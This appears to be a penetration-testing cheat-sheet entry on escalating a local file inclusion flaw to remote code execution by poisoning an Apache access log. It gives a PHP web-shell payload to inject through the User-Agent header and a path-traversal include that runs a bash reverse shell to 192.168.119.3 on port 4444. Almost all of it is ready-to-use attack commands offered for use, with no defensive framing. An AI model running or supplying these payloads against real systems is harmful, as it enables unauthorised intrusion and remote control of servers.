---
title: LFI Log Poisoning to RCE
category: initial-access
subcategory: web-attacks
os: linux
command: curl with poisoned User-Agent then include log
tools: curl, browser
---


### Step 1 - Inject PHP into the access log via User-Agent

Set the User-Agent header to a PHP payload (e.g., via Burp):

```
User-Agent: Mozlila 5.0 <?php echo system($_GET['cmd']); ?>
```

### Step 2 - Include the log file via LFI

```
../../../../../../../../../var/log/apache2/access.log&cmd=bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```
